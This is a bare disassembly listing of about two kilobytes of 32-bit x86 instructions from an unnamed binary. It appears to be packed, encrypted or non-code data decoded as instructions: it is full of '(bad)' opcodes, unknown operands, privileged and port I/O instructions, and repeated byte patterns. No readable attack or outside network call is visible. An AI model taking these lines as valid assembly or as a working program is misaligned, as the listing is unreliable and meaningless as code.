  40a5f4:	or     BYTE PTR [eax+0x44],cl
  40a5f7:	xchg   BYTE PTR [esi+ebp*4+0x3],cl
  40a5fb:	add    eax,0x3362152f
  40a600:	inc    eax
  40a601:	pop    ebp
  40a602:	or     DWORD PTR [ecx-0x3b],0x408d76cb
  40a609:	shl    BYTE PTR [edi-0x39],0x62
  40a60d:	mov    ah,0x24
  40a60f:	add    eax,0x432d80
  40a614:	add    eax,0x41107840
  40a619:	bound  eax,QWORD PTR [eax+0x40]
  40a61c:	sldt   WORD PTR [eax-0x34]
  40a620:	js     0x40a684
  40a622:	add    eax,0x40664143
  40a627:	inc    ebx
  40a628:	add    BYTE PTR [ecx+0x5],al
  40a62b:	js     0x40a66d
  40a62d:	bound  eax,QWORD PTR [eax+0x0]
  40a630:	inc    eax
  40a631:	add    eax,0x46416d02
  40a636:	xchg   BYTE PTR [eax+0x68],al
  40a639:	dec    edi
  40a63a:	mov    esi,0x35943880
  40a63f:	je     0x40a601
  40a641:	add    eax,0x55d86241
  40a646:	mov    WORD PTR [eax+0x29],?
  40a649:	ret    
  40a64a:	dec    ebp
  40a64b:	je     0x40a5ed
  40a64d:	pusha  
  40a64e:	add    eax,0x41814973
  40a653:	in     al,dx
  40a654:	add    eax,0x404341c0
  40a659:	inc    eax
  40a65a:	add    eax,0x434162
  40a65f:	inc    eax
  40a660:	add    BYTE PTR [edx+0x5],ah
  40a663:	inc    eax
  40a664:	adc    BYTE PTR [edx+0x40],ah
  40a667:	inc    ebx
  40a668:	inc    ecx
  40a669:	add    eax,0x4340
  40a66e:	add    eax,0x404162
  40a673:	add    BYTE PTR [eax+0x43],al
  40a676:	inc    eax
  40a677:	add    eax,0xbfc03f86
  40a67c:	cmp    al,0x54
  40a67e:	retf   
  40a67f:	inc    edx
  40a680:	inc    eax
  40a681:	inc    eax
  40a682:	daa    
  40a683:	out    0x40,eax
  40a685:	adc    DWORD PTR [ebp+0x25],ebp
  40a688:	mov    DWORD PTR [eax+0x60],eax
  40a68b:	add    DWORD PTR [eax-0x37],eax
  40a68e:	inc    eax
  40a68f:	add    BYTE PTR [eax],al
  40a691:	inc    ecx
  40a692:	inc    ebx
  40a693:	add    eax,0x41784062
  40a698:	inc    eax
  40a699:	inc    eax
  40a69a:	add    BYTE PTR [edi],cl
  40a69c:	bound  eax,QWORD PTR [ebx+0x0]
  40a69f:	add    eax,0x25006240
  40a6a4:	inc    eax
  40a6a5:	add    eax,0x40254143
  40a6aa:	add    eax,0x41620000
  40a6af:	jns    0x40a6b6
  40a6b1:	inc    eax
  40a6b2:	rol    DWORD PTR [edx+0x40],0xb8
  40a6b6:	push   ebx
  40a6b7:	inc    esi
  40a6b8:	xchg   BYTE PTR [ecx+edx*2+0x2],cl
  40a6bc:	pop    eax
  40a6bd:	adc    eax,0x402d9534
  40a6c2:	les    esi,FWORD PTR [eax]
  40a6c4:	inc    ebx
  40a6c5:	add    BYTE PTR [eax],al
  40a6c7:	add    BYTE PTR [ecx+0x40],al
  40a6ca:	bound  esp,QWORD PTR [esi+0x0]
  40a6cd:	inc    eax
  40a6ce:	add    eax,0x5400000
  40a6d3:	inc    ecx
  40a6d4:	inc    eax
  40a6d5:	inc    eax
  40a6d6:	bound  esp,QWORD PTR ds:0x25050043
  40a6dc:	inc    ecx
  40a6dd:	inc    ebx
  40a6de:	inc    eax
  40a6df:	test   BYTE PTR [eax+0x0],al
  40a6e2:	bound  ebx,QWORD PTR [eax+0x62]
  40a6e5:	inc    ecx
  40a6e6:	inc    eax
  40a6e7:	inc    eax
  40a6e8:	inc    edx
  40a6e9:	inc    edi
  40a6ea:	imul   ecx,DWORD PTR [eax+0x406feb40],0x42
  40a6f1:	and    al,0x42
  40a6f3:	add    eax,0x408136f0
  40a6f8:	xor    dh,dl
  40a6fa:	xor    BYTE PTR [esi+0x54435940],al
  40a700:	scas   al,BYTE PTR es:[edi]
  40a701:	cmp    cl,BYTE PTR [ebx]
  40a703:	das    
  40a704:	jp     0x40a6c7
  40a706:	add    al,0x40
  40a708:	sub    al,0xa8
  40a70a:	inc    esi
  40a70b:	xchg   DWORD PTR [eax],edx
  40a70d:	bound  eax,QWORD PTR [eax+0x41]
  40a710:	and    eax,0x40000500
  40a715:	inc    ebx
  40a716:	add    eax,0x40624041
  40a71b:	inc    ebx
  40a71c:	add    eax,0x43402541
  40a721:	bound  eax,QWORD PTR [eax+0x43]
  40a724:	int3   
  40a725:	inc    eax
  40a726:	bound  eax,QWORD PTR [eax]
  40a728:	inc    ecx
  40a729:	inc    eax
  40a72a:	inc    eax
  40a72b:	add    eax,0x356ea005
  40a730:	inc    eax
  40a731:	push   0x71059512
  40a736:	rol    BYTE PTR [eax+eax*2+0x30],0xb8
  40a73b:	ins    DWORD PTR es:[edi],dx
  40a73c:	xchg   ah,al
  40a73e:	and    eax,DWORD PTR [ecx]
  40a740:	push   eax
  40a741:	sbb    edx,DWORD PTR ds:0x41402342
  40a747:	gs dec ecx
  40a749:	dec    esi
  40a74a:	int    0xd0
  40a74c:	xchg   BYTE PTR [eax-0x40],al
  40a74f:	xchg   edi,eax
  40a750:	mov    DWORD PTR [eax+0x254062],ebp
  40a756:	inc    ax
  40a758:	add    eax,0x40404143
  40a75d:	inc    ebx
  40a75e:	add    BYTE PTR [eax],al
  40a760:	add    BYTE PTR [edx-0x34],ah
  40a763:	inc    eax
  40a764:	add    eax,0x40004041
  40a769:	inc    ecx
  40a76a:	int3   
  40a76b:	add    BYTE PTR [ebx-0x7c],al
  40a76e:	add    eax,0x5406240
  40a773:	bound  edx,QWORD PTR [ecx]
  40a775:	and    BYTE PTR ds:0x889b2640,al
  40a77b:	adc    BYTE PTR [ecx+0x46],al
  40a77e:	xchg   BYTE PTR [esi+eax*2+0x5f],cl
  40a782:	bound  eax,QWORD PTR [ecx+0x50]
  40a785:	xchg   ebp,eax
  40a786:	outs   dx,BYTE PTR ds:[esi]
  40a787:	inc    eax
  40a788:	rol    BYTE PTR [edx],0xd3
  40a78b:	push   eax
  40a78c:	or     al,0x71
  40a78e:	inc    eax
  40a78f:	bound  ebx,QWORD PTR [eax+0x41]
  40a792:	add    eax,0x40404340
  40a797:	inc    ebx
  40a798:	inc    eax
  40a799:	test   BYTE PTR [eax],al
  40a79b:	add    eax,0x40624041
  40a7a0:	inc    eax
  40a7a1:	add    BYTE PTR [edx+0x5],ah
  40a7a4:	inc    ebx
  40a7a5:	add    BYTE PTR [eax+0x78],al
  40a7a8:	inc    ecx
  40a7a9:	add    BYTE PTR [eax+0x41],bl
  40a7ac:	bound  eax,QWORD PTR [ebp+0x34242340]
  40a7b2:	add    al,0xcd
  40a7b4:	int    0x5
  40a7b6:	loopne 0x40a7e2
  40a7b8:	dec    eax
  40a7b9:	arpl   bp,cx
  40a7bb:	mov    esp,0x65408635
  40a7c0:	add    BYTE PTR [ecx+edx*2+0x5],al
  40a7c4:	inc    esi
  40a7c5:	xor    bh,BYTE PTR [edx+0x40]
  40a7c8:	adc    al,0x52
  40a7ca:	retf   
  40a7cb:	retf   
  40a7cc:	xchg   esi,eax
  40a7cd:	test   BYTE PTR [ebx+0x48406930],dh
  40a7d3:	mov    al,ds:0x407a0567
  40a7d8:	test   BYTE PTR [eax],al
  40a7da:	int3   
  40a7db:	bound  eax,QWORD PTR ds:0xcc840f41
  40a7e1:	inc    ebx
  40a7e2:	add    BYTE PTR [eax+0x0],al
  40a7e5:	inc    eax
  40a7e6:	inc    eax
  40a7e7:	inc    eax
  40a7e8:	int3   
  40a7e9:	add    BYTE PTR ds:0x62404341,al
  40a7ef:	pop    eax
  40a7f0:	add    BYTE PTR [ebx+0x40],al
  40a7f3:	bound  ecx,QWORD PTR [edi]
  40a7f5:	inc    eax
  40a7f6:	out    dx,eax
  40a7f7:	or     DWORD PTR [eax+0xd],0x86864015
  40a7fe:	inc    edx
  40a7ff:	ds popf 
  40a801:	retf   
  40a802:	retf   
  40a803:	inc    eax
  40a804:	and    eax,0xf61bb97a
  40a809:	dec    edx
  40a80a:	mov    al,ds:0x45fd8340
  40a80f:	arpl   WORD PTR [ecx+0x5f20d7d],bx
  40a815:	jp     0x40a857
  40a817:	sub    DWORD PTR [edx-0x79be3618],0x7c0630df
  40a821:	arpl   WORD PTR [esi+eax*2+0x7557a2c],si
  40a828:	fwait
  40a829:	ror    BYTE PTR ds:0x40400000,cl
  40a82f:	cmovno eax,DWORD PTR ds:0x40056243
  40a836:	int3   
  40a837:	add    ah,cl
  40a839:	inc    eax
  40a83a:	inc    eax
  40a83b:	bound  eax,QWORD PTR [ecx+0x0]
  40a83e:	add    BYTE PTR [edi],cl
  40a840:	inc    ebx
  40a841:	inc    eax
  40a842:	inc    eax
  40a843:	add    BYTE PTR [ecx+0x43],al
  40a846:	add    eax,0x40256240
  40a84b:	bound  eax,QWORD PTR [eax]
  40a84d:	xchg   esp,eax
  40a84e:	add    dl,0x40
  40a851:	out    dx,eax
  40a852:	xchg   edx,eax
  40a853:	xor    al,0x6b
  40a855:	ins    BYTE PTR es:[edi],dx
  40a856:	add    eax,0x1563297a
  40a85b:	mov    eax,ds:0x4869c4c
  40a860:	jmp    0x3442:0xd17c887
  40a867:	jp     0x40a89a
  40a869:	inc    esp
  40a86a:	adc    cl,BYTE PTR [ecx+0x5d8176cb]
  40a870:	inc    edx
  40a871:	mov    es,edi
  40a873:	push   0x7a05d611
  40a878:	sub    DWORD PTR [edx],esi
  40a87a:	mov    cs,WORD PTR [eax+0x34]
  40a87d:	add    eax,0x4140cc00
  40a882:	inc    eax
  40a883:	inc    ebx
  40a884:	bound  esp,QWORD PTR ds:0x41400043
  40a88a:	add    BYTE PTR [eax],al
  40a88c:	add    eax,0x43624062
  40a891:	inc    ecx
  40a892:	inc    eax
  40a893:	inc    eax
  40a894:	inc    eax
  40a895:	add    eax,0x40624340
  40a89a:	add    eax,0x40664140
  40a89f:	or     eax,DWORD PTR [esi-0x759fdeaa]
  40a8a5:	pop    ss
  40a8a6:	dec    esp
  40a8a7:	and    al,0x29
  40a8a9:	jp     0x40a8eb
  40a8ab:	push   gs
  40a8ad:	mov    DWORD PTR ds:0x35518054,eax
  40a8b3:	pop    eax
  40a8b4:	shl    DWORD PTR [ebx+0x7b],1
  40a8b7:	outs   dx,BYTE PTR ds:[esi]
  40a8b8:	add    eax,0x6186407a
  40a8bd:	dec    esp
  40a8be:	mov    ah,0x46
  40a8c0:	xchg   BYTE PTR [edi+0x32],al
  40a8c3:	outs   dx,DWORD PTR ds:[esi]
  40a8c4:	xchg   esi,eax
  40a8c5:	ret    0x9505
  40a8c8:	daa    
  40a8c9:	jp     0x40a89e
  40a8cb:	jo     0x40a935
  40a8cd:	cmc    
  40a8ce:	retf   
  40a8cf:	(bad)  
  40a8d0:	inc    DWORD PTR [ebx+0x0]
  40a8d3:	add    eax,0x41107840
  40a8d8:	bound  eax,QWORD PTR [eax+0x40]
  40a8db:	sldt   WORD PTR [eax-0x34]
  40a8df:	js     0x40a943
  40a8e1:	add    eax,0x40664143
  40a8e6:	inc    ebx
  40a8e7:	add    BYTE PTR [ecx+0x5],al
  40a8ea:	js     0x40a92c
  40a8ec:	bound  eax,QWORD PTR [eax+0x0]
  40a8ef:	inc    eax
  40a8f0:	inc    eax
  40a8f1:	inc    edx
  40a8f2:	les    ecx,FWORD PTR [ebp+0x63]
  40a8f5:	mov    edi,0x29790560
  40a8fa:	outs   dx,DWORD PTR ds:[esi]
  40a8fb:	push   ebx
  40a8fc:	push   edx
  40a8fd:	mov    edi,0xe2b78605
  40a902:	call   0x4040:0x434155ac
  40a909:	add    eax,0x434162
  40a90e:	inc    eax
  40a90f:	add    BYTE PTR [edx+0x5],ah
  40a912:	inc    eax
  40a913:	adc    BYTE PTR [edx+0x40],ah
  40a916:	inc    ebx
  40a917:	inc    ecx
  40a918:	add    eax,0x4340
  40a91d:	add    eax,0x404162
  40a922:	add    BYTE PTR [eax+0x43],al
  40a925:	inc    eax
  40a926:	add    eax,0x792863bf
  40a92b:	dec    ebx
  40a92c:	ins    BYTE PTR es:[edi],dx
  40a92d:	vmwrite ebx,DWORD PTR [ecx-0xf]
  40a931:	(bad)  
  40a932:	mov    al,0x40
  40a934:	shl    BYTE PTR [eax+0x6a],0xa9
  40a938:	test   eax,0x7f257905
  40a93d:	ror    BYTE PTR [esp+esi*4+0x20],cl
  40a941:	xchg   BYTE PTR [ebp-0x1943bfb7],ah
  40a947:	adc    eax,0x42793452
  40a94c:	inc    eax
  40a94d:	add    BYTE PTR [eax],al
  40a94f:	inc    ecx
  40a950:	inc    ebx
  40a951:	add    eax,0x41784062
  40a956:	inc    eax
  40a957:	inc    eax
  40a958:	add    BYTE PTR [edi],cl
  40a95a:	bound  eax,QWORD PTR [ebx+0x0]
  40a95d:	add    eax,0x25006240
  40a962:	inc    eax
  40a963:	add    eax,0x40254143
  40a968:	add    eax,0x33620000
  40a96d:	inc    eax
  40a96e:	std    
  40a96f:	leave  
  40a970:	ret    0x9ffd
  40a973:	ss retf 
  40a975:	dec    eax
  40a976:	gs inc edx
  40a978:	test   eax,0xc1d77905
  40a97d:	inc    eax
  40a97e:	push   ebp
  40a97f:	inc    ecx
  40a980:	mov    eax,0x4386
  40a985:	add    BYTE PTR [ecx+0x40],al
  40a988:	bound  esp,QWORD PTR [esi+0x0]
  40a98b:	inc    eax
  40a98c:	add    eax,0x5400000
  40a991:	inc    ecx
  40a992:	inc    eax
  40a993:	inc    eax
  40a994:	bound  esp,QWORD PTR ds:0x25050043
  40a99a:	inc    ecx
  40a99b:	inc    ebx
  40a99c:	inc    eax
  40a99d:	test   BYTE PTR [eax+0x0],al
  40a9a0:	bound  ebx,QWORD PTR [eax+0x62]
  40a9a3:	inc    ecx
  40a9a4:	inc    eax
  40a9a5:	xchg   esi,eax
  40a9a6:	inc    eax
  40a9a7:	stc    
  40a9a8:	inc    eax
  40a9a9:	mov    ah,0x14
  40a9ab:	scas   eax,DWORD PTR es:[edi]
  40a9ac:	sub    DWORD PTR [ecx+0x60],edi
  40a9af:	rol    DWORD PTR [eax+0x68],0xcd
  40a9b3:	inc    ebx
  40a9b4:	cld    
  40a9b5:	mov    ch,BYTE PTR [ebx+0x49]
  40a9b8:	dec    eax
  40a9b9:	test   al,0xb4
  40a9bb:	inc    ebx
  40a9bc:	add    eax,0x40c04279
  40a9c1:	add    eax,0x8486500d
  40a9c6:	adc    BYTE PTR [ecx],ch
  40a9c8:	adc    BYTE PTR [edx+0x40],ah
  40a9cb:	inc    ecx
  40a9cc:	and    eax,0x40000500
  40a9d1:	inc    ebx
  40a9d2:	add    eax,0x40624041
  40a9d7:	inc    ebx
  40a9d8:	add    eax,0x43402541
  40a9dd:	bound  eax,QWORD PTR [eax+0x43]
  40a9e0:	int3   
  40a9e1:	inc    eax
  40a9e2:	bound  eax,QWORD PTR [eax]
  40a9e4:	inc    ecx
  40a9e5:	inc    eax
  40a9e6:	inc    eax
  40a9e7:	add    eax,0xcbcb4005
  40a9ec:	inc    esi
  40a9ed:	aaa    
  40a9ee:	jns    0x40a9da
  40a9f0:	into   
  40a9f1:	ins    DWORD PTR es:[edi],dx
  40a9f2:	(bad)  
  40a9f3:	mov    al,0xfc
  40a9f5:	sti    
  40a9f6:	dec    ecx
  40a9f7:	fisttp QWORD PTR [ebx+0x6805f342]
  40a9fd:	add    eax,0xafc14c79
  40aa02:	gs inc ebx
  40aa04:	lods   al,BYTE PTR ds:[esi]
  40aa05:	xchg   BYTE PTR [eax+0x62],al
  40aa08:	inc    ecx
  40aa09:	int    0xbf
  40aa0b:	inc    esp
  40aa0c:	ret    
  40aa0d:	and    DWORD PTR [eax+0x63],edi
  40aa10:	rcr    BYTE PTR [edx],0x44
  40aa13:	fs dec esi
  40aa15:	cli    
  40aa16:	mov    bh,0x45
  40aa18:	xor    eax,0x3e406245
  40aa1d:	add    eax,0x40626578
  40aa22:	and    eax,0x5406600
  40aa27:	inc    ebx
  40aa28:	inc    ecx
  40aa29:	inc    eax
  40aa2a:	inc    eax
  40aa2b:	inc    ebx
  40aa2c:	add    BYTE PTR [eax],al
  40aa2e:	add    BYTE PTR [edx-0x34],ah
  40aa31:	inc    eax
  40aa32:	add    eax,0x40004041
  40aa37:	inc    ecx
  40aa38:	int3   
  40aa39:	add    BYTE PTR [ebx-0x7c],al
  40aa3c:	add    eax,0x5406240
  40aa41:	bound  eax,QWORD PTR [esi-0x61]
  40aa44:	lods   al,BYTE PTR ds:[esi]
  40aa45:	dec    esp
  40aa46:	imul   eax,DWORD PTR [esi+0x5bc040b0],0x33712c15
  40aa50:	js     0x40aa7a
  40aa52:	pusha  
  40aa53:	or     ebx,0xffffff9c
  40aa56:	mov    al,ds:0x5a6da7f9
  40aa5b:	dec    esp
  40aa5c:	jae    0x40aa52
  40aa5e:	fs add eax,0xcec14078
  40aa64:	fist   WORD PTR [ebx+0x1b]
  40aa67:	xchg   BYTE PTR [ecx+0x62405524],ah
  40aa6d:	pop    eax
  40aa6e:	inc    ecx
  40aa6f:	add    eax,0x40404340
  40aa74:	inc    ebx
  40aa75:	inc    eax
  40aa76:	test   BYTE PTR [eax],al
  40aa78:	add    eax,0x40624041
  40aa7d:	inc    eax
  40aa7e:	add    BYTE PTR [edx+0x5],ah
  40aa81:	inc    ebx
  40aa82:	add    BYTE PTR [eax+0x78],al
  40aa85:	inc    ecx
  40aa86:	add    BYTE PTR [eax+0x41],bl
  40aa89:	(bad)
  40aa8e:	xor    eax,0xf4c26378
  40aa93:	add    cl,BYTE PTR [esi+0x4e]
  40aa96:	clc    
  40aa97:	nop
  40aa98:	inc    eax
  40aa99:	mov    bl,0x4b
  40aa9b:	inc    esp
  40aa9c:	dec    eax
  40aa9d:	ds add eax,0xfe96f578
  40aaa3:	sub    ch,BYTE PTR [ebx-0x37]
  40aaa6:	xchg   BYTE PTR [ebx+0x40774037],al
  40aaac:	test   BYTE PTR [eax],al
  40aaae:	int3   
  40aaaf:	bound  eax,QWORD PTR ds:0xcc840f41
  40aab5:	inc    ebx
  40aab6:	add    BYTE PTR [eax+0x0],al
  40aab9:	inc    eax
  40aaba:	inc    eax
  40aabb:	inc    eax
  40aabc:	int3   
  40aabd:	add    BYTE PTR ds:0x62404341,al
  40aac3:	pop    eax
  40aac4:	add    BYTE PTR [ebx+0x40],al
  40aac7:	bound  ecx,QWORD PTR [edi]
  40aac9:	inc    eax
  40aaca:	jo     0x40ab10
  40aacc:	mov    BYTE PTR [eax+0x78],al
  40aacf:	arpl   WORD PTR [ebx],si
  40aad1:	push   0x8
  40aad3:	cmp    BYTE PTR [esi],ch
  40aad5:	mov    esi,0x2f2a40e2
  40aada:	leave  
  40aadb:	jnp    0x40aa61
  40aadd:	add    eax,0x6bc43278
  40aae2:	mov    al,0x30
  40aae4:	bound  eax,QWORD PTR [esi-0x2b56a831]
  40aaea:	inc    ecx
  40aaeb:	test   eax,0x40782d12
  40aaf0:	xor    al,0x1d
  40aaf2:	inc    esp
  40aaf3:	add    DWORD PTR [eax],esp
  40aaf5:	mov    ebp,0x28c0243c
  40aafa:	enter  0x4f38,0x5
  40aafe:	js     0x40ab79
  40ab00:	adc    DWORD PTR [ebx+0x74],ebx
  40ab03:	lods   al,BYTE PTR ds:[esi]
  40ab04:	xor    eax,0x3286
  40ab09:	inc    eax
  40ab0a:	inc    eax
  40ab0b:	cmovno eax,DWORD PTR ds:0x40056243
  40ab12:	int3   
  40ab13:	add    ah,cl
  40ab15:	inc    eax
  40ab16:	inc    eax
  40ab17:	bound  eax,QWORD PTR [ecx+0x0]
  40ab1a:	add    BYTE PTR [edi],cl
  40ab1c:	inc    ebx
  40ab1d:	inc    eax
  40ab1e:	inc    eax
  40ab1f:	add    BYTE PTR [ecx+0x43],al
  40ab22:	add    eax,0x40256240
  40ab27:	bound  eax,QWORD PTR [eax]
  40ab29:	inc    edx
  40ab2a:	inc    eax
  40ab2b:	inc    edx
  40ab2c:	adc    DWORD PTR [eax],esi
  40ab2e:	es das 
  40ab30:	js     0x40ab54
  40ab32:	inc    DWORD PTR [ecx+ecx*8+0x25bc3ae9]
  40ab39:	pop    edi
  40ab3a:	push   0x634cbc21
  40ab3f:	add    eax,0xa5a4278
  40ab44:	inc    ecx
  40ab45:	inc    esp
  40ab46:	xchg   BYTE PTR [esi-0x73eeaf5],al
  40ab4c:	inc    ebp
  40ab4d:	ins    DWORD PTR es:[edi],dx
  40ab4e:	add    eax,0x4140cc00
  40ab53:	inc    eax
  40ab54:	inc    ebx
  40ab55:	bound  esp,QWORD PTR ds:0x41400043
  40ab5b:	add    BYTE PTR [eax],al
  40ab5d:	add    eax,0x43624062
  40ab62:	inc    ecx
  40ab63:	inc    eax
  40ab64:	inc    eax
  40ab65:	inc    eax
  40ab66:	add    eax,0x40624340
  40ab6b:	add    eax,0x40664140
  40ab70:	xchg   esp,eax
  40ab71:	and    edi,DWORD PTR [eax+0x38]
  40ab74:	inc    edi
  40ab75:	repz enter 0x64cb,0xbb
  40ab7a:	jnp    0x40abbc
  40ab7c:	shl    BYTE PTR [esi],0x52
  40ab7f:	mov    edi,0x30780549
  40ab84:	xor    al,0x3a
  40ab86:	fs mov edi,0x405b8634
  40ab8c:	cwde   
  40ab8d:	outs   dx,BYTE PTR ds:[esi]
  40ab8e:	fisttp QWORD PTR [edx]
  40ab90:	loope  0x40ac00
  40ab92:	js     0x40ac07
  40ab94:	ret    
  40ab95:	arpl   WORD PTR [eax+0x22],bx
  40ab98:	test   al,0xba
  40ab9a:	push   ecx
  40ab9b:	inc    eax
  40ab9c:	inc    eax
  40ab9d:	cdq    
  40ab9e:	stos   DWORD PTR es:[edi],eax
  40ab9f:	test   al,0x10
  40aba1:	add    eax,0x437178
  40aba6:	add    eax,0x41107840
  40abab:	bound  eax,QWORD PTR [eax+0x40]
  40abae:	sldt   WORD PTR [eax-0x34]
  40abb2:	js     0x40ac16
  40abb4:	add    eax,0x40664143
  40abb9:	inc    ebx
  40abba:	add    BYTE PTR [ecx+0x5],al
  40abbd:	js     0x40abff
  40abbf:	bound  eax,QWORD PTR [eax+0x0]
  40abc2:	inc    eax
  40abc3:	shl    BYTE PTR [edi],0x68
  40abc6:	inc    ebx
  40abc7:	mov    ah,0x86
  40abc9:	inc    esp
  40abca:	inc    eax
  40abcb:	xor    edi,edi
  40abcd:	add    al,BYTE PTR [ecx+0x41]
  40abd0:	and    DWORD PTR [edi+0x40],esi
  40abd3:	sbb    dl,BYTE PTR [ecx+ecx*8]
  40abd6:	and    al,0x86
  40abd8:	mov    ecx,0x43417aab
  40abdd:	inc    eax
  40abde:	inc    eax
  40abdf:	add    eax,0x434162
  40abe4:	inc    eax
  40abe5:	add    BYTE PTR [edx+0x5],ah
  40abe8:	inc    eax
  40abe9:	adc    BYTE PTR [edx+0x40],ah
  40abec:	inc    ebx
  40abed:	inc    ecx
  40abee:	add    eax,0x4340
  40abf3:	add    eax,0x404162
  40abf8:	add    BYTE PTR [eax+0x43],al
  40abfb:	inc    eax
  40abfc:	add    eax,0x12b09ec0
  40ac01:	xchg   esp,eax
  40ac02:	add    eax,0x172c7377
  40ac07:	inc    ebx
  40ac08:	in     al,dx
  40ac09:	xchg   BYTE PTR gs:[ebx+0x44699a40],bl
  40ac10:	push   ds
  40ac11:	mov    ?,WORD PTR ds:0x8d5e3a77
  40ac17:	enter  0x843c,0xb8
  40ac1b:	fiadd  WORD PTR [eax-0x40]
  40ac1e:	xchg   edi,eax
  40ac1f:	ins    BYTE PTR es:[edi],dx
  40ac20:	dec    eax
  40ac21:	bound  eax,QWORD PTR ds:0x40602977
  40ac27:	add    BYTE PTR [eax],al
  40ac29:	inc    ecx
  40ac2a:	inc    ebx
  40ac2b:	add    eax,0x41784062
  40ac30:	inc    eax
  40ac31:	inc    eax
  40ac32:	add    BYTE PTR [edi],cl
  40ac34:	bound  eax,QWORD PTR [ebx+0x0]
  40ac37:	add    eax,0x25006240
  40ac3c:	inc    eax
  40ac3d:	add    eax,0x40254143
  40ac42:	add    eax,0x46620000
  40ac47:	or     BYTE PTR ds:0x2ad08676,cl
  40ac4d:	call   0x3d0c7625
  40ac52:	xor    al,BYTE PTR [eax+0x40]
  40ac55:	(bad)  
  40ac58:	mov    ah,0xf
  40ac5a:	mov    bh,0x40
  40ac5c:	ins    DWORD PTR es:[edi],dx
  40ac5d:	inc    edx
  40ac5e:	nop
  40ac5f:	or     eax,0x4005ec41
  40ac64:	push   ds
  40ac65:	shl    BYTE PTR [esi+0x42],0x2a
  40ac69:	arpl   WORD PTR [esi+0x457e4018],ax
  40ac6f:	push   ebx
  40ac70:	aam    0x81
  40ac72:	das    
  40ac73:	inc    eax
  40ac74:	add    eax,0xb038645d
  40ac79:	and    al,0x43
  40ac7b:	add    BYTE PTR [eax],al
  40ac7d:	add    BYTE PTR [ecx+0x40],al
  40ac80:	bound  esp,QWORD PTR [esi+0x0]
  40ac83:	inc    eax
  40ac84:	add    eax,0x5400000
  40ac89:	inc    ecx
  40ac8a:	inc    eax
  40ac8b:	inc    eax
  40ac8c:	bound  esp,QWORD PTR ds:0x25050043
  40ac92:	inc    ecx
  40ac93:	inc    ebx
  40ac94:	inc    eax
  40ac95:	test   BYTE PTR [eax+0x0],al
  40ac98:	bound  ebx,QWORD PTR [eax+0x62]
  40ac9b:	inc    ecx
  40ac9c:	inc    eax
  40ac9d:	mov    dh,0x40
  40ac9f:	cs shl ah,0x54
  40aca3:	adc    eax,0x72d00571
  40aca8:	jl     0x40ac8d
  40acaa:	fs retf 
  40acac:	test   al,0x86
  40acae:	inc    eax
  40acaf:	inc    eax
  40acb0:	inc    eax
  40acb1:	out    0xd1,al
  40acb3:	adc    al,0x10
  40acb5:	bound  eax,QWORD PTR [eax+0x41]
  40acb8:	and    eax,0x40000500
  40acbd:	inc    ebx
  40acbe:	add    eax,0x40624041
  40acc3:	inc    ebx
  40acc4:	add    eax,0x43402541
  40acc9:	bound  eax,QWORD PTR [eax+0x43]
  40accc:	int3   
  40accd:	inc    eax
  40acce:	bound  eax,QWORD PTR [eax]
  40acd0:	inc    ecx
  40acd1:	inc    eax
  40acd2:	inc    eax
  40acd3:	add    eax,0x40268105
  40acd8:	es ret 
  40acda:	adc    esi,DWORD PTR [edx+0x41]
  40acdd:	and    eax,0xf51640b5
  40ace2:	rep stos DWORD PTR es:[edi],eax
  40ace4:	adc    ch,BYTE PTR [eax+0x5]
  40ace7:	jb     0x40ad29
  40ace9:	pop    ecx
  40acea:	shl    DWORD PTR [eax+0x28],cl
  40aced:	jae    0x40ac75
  40acef:	xchg   ebp,eax
  40acf0:	jnp    0x40acb2
  40acf2:	jo     0x40ad05
  40acf4:	bound  eax,QWORD PTR [eax+0x25]
  40acf7:	add    BYTE PTR [esi+0x40],ah
  40acfa:	add    eax,0x40404143
  40acff:	inc    ebx
  40ad00:	add    BYTE PTR [eax],al
  40ad02:	add    BYTE PTR [edx-0x34],ah
  40ad05:	inc    eax
  40ad06:	add    eax,0x40004041
  40ad0b:	inc    ecx
  40ad0c:	int3   
  40ad0d:	add    BYTE PTR [ebx-0x7c],al
  40ad10:	add    eax,0x5406240
  40ad15:	bound  eax,QWORD PTR [eax+ebp*1+0x26]
  40ad19:	inc    eax
  40ad1a:	inc    edx
  40ad1b:	dec    edx
  40ad1c:	mov    cl,cl
  40ad1e:	and    al,0xb9
  40ad20:	mov    ah,0x40
  40ad22:	inc    esp
  40ad23:	inc    eax
  40ad24:	cli    
  40ad25:	mov    al,0xd7
  40ad27:	in     al,dx
  40ad28:	add    eax,0x824d7040
  40ad2d:	adc    eax,0x4c869058
  40ad32:	inc    edx
  40ad33:	inc    eax
  40ad34:	retf   0x1244
  40ad37:	add    eax,0x7e40402c
  40ad3c:	std    
  40ad3d:	dec    ebp
  40ad3e:	jmp    0x6240:0x1540b387
  40ad45:	pop    eax
  40ad46:	inc    ecx
  40ad47:	add    eax,0x40404340
  40ad4c:	inc    ebx
  40ad4d:	inc    eax
  40ad4e:	test   BYTE PTR [eax],al
  40ad50:	add    eax,0x40624041
  40ad55:	inc    eax
  40ad56:	add    BYTE PTR [edx+0x5],ah
  40ad59:	inc    ebx
  40ad5a:	add    BYTE PTR [eax+0x78],al
  40ad5d:	inc    ecx
  40ad5e:	add    BYTE PTR [eax+0x41],bl
  40ad61:	bound  eax,QWORD PTR [ecx-0x6fbedb03]
  40ad67:	add    eax,0xb2c07830
  40ad6c:	add    BYTE PTR fs:[ecx-0x7a],0x40
  40ad71:	inc    eax
  40ad72:	jnp    0x40add0
  40ad74:	add    al,bl
  40ad76:	xor    ch,BYTE PTR [edi]
  40ad78:	inc    eax
  40ad79:	arpl   dx,ax
  40ad7b:	jo     0x40ad46
  40ad7d:	cwde   
  40ad7e:	push   esp
  40ad7f:	mov    dl,0x40
  40ad81:	inc    eax
  40ad82:	inc    ecx
  40ad83:	cmc    
  40ad84:	mov    esp,0x73056305
  40ad89:	jp     0x40ad50
  40ad8b:	mov    edi,0x867ecb05
  40ad90:	mov    ecx,0x42a9ddca
  40ad95:	cwde   
  40ad96:	sub    al,0x24
  40ad98:	jno    0x40adda
  40ad9a:	rol    BYTE PTR [edi],0x5b
  40ad9d:	inc    eax
  40ad9e:	test   BYTE PTR [eax],al
  40ada0:	int3   
  40ada1:	bound  eax,QWORD PTR ds:0xcc840f41
  40ada7:	inc    ebx
  40ada8:	add    BYTE PTR [eax+0x0],al
  40adab:	inc    eax
  40adac:	inc    eax
  40adad:	inc    eax
  40adae:	int3   
  40adaf:	add    BYTE PTR ds:0x62404341,al
  40adb5:	pop    eax
  40adb6:	add    BYTE PTR [ebx+0x40],al
  40adb9:	bound  ecx,QWORD PTR [edi]
  40adbb:	inc    eax
  40adbc:	adc    eax,0x2ff0b1ce
